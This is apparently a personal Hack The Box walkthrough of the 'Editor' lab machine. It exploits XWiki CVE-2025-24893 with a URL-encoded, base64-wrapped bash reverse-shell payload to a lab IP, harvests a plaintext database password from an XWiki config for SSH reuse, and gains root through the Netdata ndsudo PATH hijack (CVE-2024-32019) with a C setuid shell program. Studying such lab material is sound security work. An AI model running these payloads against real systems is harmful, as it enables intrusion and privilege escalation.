---
{"dg-publish":true,"permalink":"/personal-site/completed-writeups/htb/editor/","tags":["#linux","xwiki","remote-code-execution","groovyscript","relative-path-hijacking","SUIDBinary","netdata","jetty","maven","tomcat"]}
---

# 10.10.11.80
---
# Initial Enumeration & Recon bits
I like to leave my Discovery/Enumeration & Recon relatively unstructured, just to build up application context so I can think about how to crack it
## Ports

```sh
rustscan -a 10.10.11.80 -- -A
```

```bash hl:1,3,8
22/tcp   open  ssh     syn-ack OpenSSH 8.9p1 Ubuntu 3ubuntu0.13 (Ubuntu Linux; protocol 2.0)

80/tcp   open  http    syn-ack nginx 1.18.0 (Ubuntu)
|_http-title: Did not follow redirect to http://editor.htb/
| http-methods:
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-server-header: nginx/1.18.0 (Ubuntu)
8080/tcp open  http    syn-ack Jetty 10.0.20
| http-robots.txt: 50 disallowed entries (40 shown) <SNIP>
| http-methods:
|   Supported Methods: OPTIONS GET HEAD PROPFIND LOCK UNLOCK
|_  Potentially risky methods: PROPFIND LOCK UNLOCK
| http-webdav-scan:
|   WebDAV type: Unknown
|   Server Type: Jetty(10.0.20)
|_  Allowed Methods: OPTIONS, GET, HEAD, PROPFIND, LOCK, UNLOCK
| http-cookie-flags:
|   /:
|     JSESSIONID:
|_      httponly flag not set
| http-title: XWiki - Main - Intro
|_Requested resource was http://10.10.11.80:8080/xwiki/bin/view/Main/
|_http-open-proxy: Proxy might be redirecting requests
|_http-server-header: Jetty(10.0.20
```

## Other Recon Bits
### Vhosts
- `wiki.editor.htb`

### Manual Browsing
#### editor.htb
![Pasted image 20250807182724.png](/img/user/img/Pasted%20image%2020250807182724.png)
Download page for a simple code editor, will look at shortly. there's a link to a wiki for it at the `wiki.editor.htb` vhost, and an about page
- reversing the binary might be a bit of a rabbit hole considering this is "easy" plus I'm bad at rev lol
#### wiki.editor.htb
It seems this is the service running on port 8080 as well.
![Pasted image 20250807183316.png](/img/user/img/Pasted%20image%2020250807183316.png)
- version 15.10.8, maybe a cve? I can see this one post, and some user history for neal. I can also export posts to pdf & html. there's also a post for how to install the code editor.
	- [cve-2025-24893](https://www.ionix.io/blog/xwiki-remote-code-execution-vulnerability-cve-2025-24893/)

> [!example]+ cve details
> The vulnerable endpoint:
>
> ```http
> http://$(host)/xwiki/bin/get/Main/SolrSearch?media=rss&text=$(payload)
> ```
> By injecting malicious Groovy code, an attacker can gain unauthorized access. Here’s an example of a **proof-of-concept (PoC) exploit**:
>
> ```http
> http://$(host)/xwiki/bin/get/Main/SolrSearch?media=rss&text=}}}{{async async=false}}{{groovy}}println("Exploit Successful! Result: " + (23 + 19)){{/groovy}}{{/async}}
>```
> 
>
> If the system is vulnerable, it will return:
>
> **Exploit Successful! Result: 42**
> 
> This confirms that **remote code execution (RCE) is possible**. Attackers can replace the Groovy payload with more malicious commands, such as fetching malware, establishing backdoors, or exfiltrating sensitive data.

###### robots.txt
![Pasted image 20250807184050.png](/img/user/img/Pasted%20image%2020250807184050.png)
most of these endpoints have nothing, or are locked behind authentication or authorization.
## Creds
~~neal bagwell user? maybe cupp&anarchy?~~
## Recon Summary:
1. find wiki vhost
2. find cve based on version (*CVE-2025-24893*)
3. find *[The Writeup](https://www.ionix.io/blog/xwiki-remote-code-execution-vulnerability-cve-2025-24893/)*
# Exploitation -> foothold
## What Worked:
1. read the cve details/writeup
2. craft groovyscript payload for revshell
3. send to endpoint and catch on listener

> [!bug]+ payload
> ```groovy
> http://wiki.editor.htb/xwiki/bin/get/Main/SolrSearch?media=rss&text=%7D%7D%7D%7B%7Basync%20async=false%7D%7D%7B%7Bgroovy%7D%7D%22bash%20-c%20%7Becho,YmFzaCAtYyAnc2ggLWkgPiYgL2Rldi90Y3AvMTAuMTAuMTYuNC80NDUxIDA%2BJjEn%7D%7C%7Bbase64,-d%7D%7C%7Bbash,-i%7D%22.execute%28%29%7B%7B%2Fgroovy%7D%7D%7B%7B%2Fasync%7D%7D
> ```
>
> > [!example]+ details
> > ```groovy
> > }}}{{async async=false}}{{groovy}}"bash -c {echo,YmFzaCAtYyAnc2ggLWkgPiYgL2Rldi90Y3AvMTAuMTAuMTYuNC80NDUxIDA+JjEn}|{base64,-d}|{bash,-i}".execute(){{/groovy}}{{/async}}
> > ```
> > - where the base64 is a revshell in the form of:
> > ```sh
> > bash -c 'sh -i >& /dev/tcp/$IP/$PORT 0>&1'
> > ```
> > so in total it just wraps it in a base64 decode pipe:
> > ```sh
> > echo "$base64payload" | base64 -d
> > ```
> > and the whole thing is urlencoded
> 
> make sure to have a listener up to catch the revshell

So just modify it with your IP and port for your revshell and it should work:

![Pasted image 20250807211640.png](/img/user/img/Pasted%20image%2020250807211640.png)
# Post Exploitation, Pivoting, & Privesc
## System Enumeration
### Users
```sh
cat /etc/passwd | grep sh
```

```txt
root:x:0:0:root:/root:/bin/bash
sshd:x:106:65534::/run/sshd:/usr/sbin/nologin
fwupd-refresh:x:112:118:fwupd-refresh user,,,:/run/systemd:/usr/sbin/nologin
oliver:x:1000:1000:,,,:/home/oliver:/bin/bash
```
- `oliver` user
### Container escape?
![Pasted image 20250808095607.png](/img/user/img/Pasted%20image%2020250808095607.png)
- looks like docker host or container?, and I don't think I have any sysadmin caps. Additionally the system is read-only I can't load in deepce.sh
- *Post-Oliver*: linpeas says it's not a container?

#### /etc/xwiki/ (xwiki configs)

```sh
grep -r password /etc/xwiki 
```

```xml
/etc/xwiki/hibernate.cfg.xml:    <property name="hibernate.connection.password">theEd1t0rTeam99</property>
/etc/xwiki/hibernate.cfg.xml:    <property name="hibernate.connection.password">xwiki</property>
/etc/xwiki/hibernate.cfg.xml:    <property name="hibernate.connection.password">xwiki</property>
/etc/xwiki/hibernate.cfg.xml:    <property name="hibernate.connection.password"></property>
/etc/xwiki/hibernate.cfg.xml:    <property name="hibernate.connection.password">xwiki</property>
---SNIP---
```


```sh
grep -r "theEd1t0rTeam99" --context 5
```

```xml
hibernate.cfg.xml-         If you want the main wiki database to be different than "xwiki" (or the default schema for schema based
hibernate.cfg.xml-         engines) you will also have to set the property xwiki.db in xwiki.cfg file
hibernate.cfg.xml-    -->
hibernate.cfg.xml-    <property name="hibernate.connection.url">jdbc:mysql://localhost/xwiki?useSSL=false&amp;connectionTimeZone=LOCAL&amp;allowPublicKeyRetrieval=true</property>
hibernate.cfg.xml-    <property name="hibernate.connection.username">xwiki</property>
hibernate.cfg.xml:    <property name="hibernate.connection.password">theEd1t0rTeam99</property>
hibernate.cfg.xml-    <property name="hibernate.connection.driver_class">com.mysql.cj.jdbc.Driver</property>
hibernate.cfg.xml-    <property name="hibernate.dbcp.poolPreparedStatements">true</property>
hibernate.cfg.xml-    <property name="hibernate.dbcp.maxOpenPreparedStatements">20</property>
hibernate.cfg.xml-
hibernate.cfg.xml-    <property name="hibernate.connection.charSet">UTF-8</property>
```
- should be able to log into the db, but need to perform a Shell Upgrade first.

> [!example]+ Shell Upgrade
> ### In reverse shell
>```sh
>python -c 'import pty; pty.spawn("/bin/bash")'
>[C - z] to background
>```
>### In host
>```sh
>stty raw -echo
>fg
>```

Digging through tables, I'm not seeing anything useful. it's possible that this password is reused by oliver though.
It sure was! *user.txt is in oliver home dir.*

```sh
ssh oliver@editor.htb
```

```sh
The authenticity of host 'editor.htb (10.10.11.80)' can't be established.
ED25519 key fingerprint is SHA256:TgNhCKF6jUX7MG8TC01/MUj/+u0EBasUVsdSQMHdyfY.
This key is not known by any other names.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added 'editor.htb' (ED25519) to the list of known hosts.
oliver@editor.htb's password:
```

![Pasted image 20250808135513.png](/img/user/img/Pasted%20image%2020250808135513.png)
#### Oliver

![Pasted image 20250808140744.png](/img/user/img/Pasted%20image%2020250808140744.png)
- no sudo, and no other users on the container
  
![Pasted image 20250808140125.png](/img/user/img/Pasted%20image%2020250808140125.png)
- netdata group
  
![Pasted image 20250808142917.png](/img/user/img/Pasted%20image%2020250808142917.png)
- SUID binaries on the system, all the netdata binaries have netdata group owner

It's probably abuse of one of these netdata binaries.

Searching for each of the netdata binaries along with privesc leads you to:
- [cve-2024-32019](https://github.com/netdata/netdata/security/advisories/GHSA-pmhq-4cxq-wj93)

> [!example]+ cve details
> ### Summary
>
>The `ndsudo` tool shipped with affected versions of the Netdata Agent allows an attacker to run arbitrary programs with root permissions.
>
>### Details
>
>The `ndsudo` tool is packaged as a `root`-owned executable with the SUID bit set.  
>It only runs a restricted set of external commands, but its search paths are supplied by the `PATH` environment variable. This allows an attacker to control where `ndsudo` looks for these commands, which may be a path the attacker has write access to.
>
>### PoC
>
>As a user that has permission to run `ndsudo`:
>
>1. Place an executable with a name that is on `ndsudo`’s list of commands (e.g. `nvme`) in a writable path
>2. Set the `PATH` environment variable so that it contains this path
>3. Run `ndsudo` with a command that will run the aforementioned executable
>
>### Impact
>
>Local privilege escalation.
## Creds

`oliver:theEd1t0rTeam99`

## What Worked
- Find DB password in `/etc/xwiki/hibernate.cfg.xml`
- Re-use password to log in as oliver
- Find ndsudo binary on system by searching for suid binaries
- Ensure oliver is in netdata group
- Write a simple C program to spawn a root shell (see poc)
- Compile it locally (gcc not on victim) and name it as one of:
	- nvme
	- megacli
	- arcconf
- Port it over to a writeable directory like `/tmp`
- Add `/tmp` to PATH: `export PATH=/tmp:$PATH`
- Run ndsudo and the command you named it as
	- `./ndsudo nvme-list` (calls `$PATH/nvme)
- A root shell should spawn
  
> [!bug]+ PoC
> ```c
> #include <unistd.h>
#include <stdlib.h>
>
>int main() {
 >       setuid(0);
 >       setgid(0);
 >       execl("/bin/bash","bash","-i", NULL);
 >       return 0;
>}
> ```
> > [!example]+ details
> > ```c
> > setuid(0);
> > setuid(0);
> > ```
> > these ensure a root shell will spawn
> > ```c
> > execl("/bin/bash", "bash", "-i", NULL);
> > return 0;
> > ```
> > `execl()` takes argv args basically, but needs path to binary as well so the PoC is just running `bash -i` as if the user were root. 
> 
> doing this as a compiled binary rather than shell script will ensure any permission changes. I tried to do it with a script, but was only able to spawn a regular shell as oliver.

Just make sure to place the compiled binary in a writable location, and add that directory to $PATH so the relative path hijack will execute the PoC with elevated privileges.

![Pasted image 20250808152937.png](/img/user/img/Pasted%20image%2020250808152937.png)

---
# rumination/rubber duck/misc

- Stored XSS capability in HTTP Meta Info (*I guess by design*) in admin panel -> Look & feel -> Presentation
![Pasted image 20250808180805.png](/img/user/img/Pasted%20image%2020250808180805.png)
- I got in by using the password reset link sent by xwiki to neal who is admin on the site. you can find mails in the xwiki user home dir under `data/`. 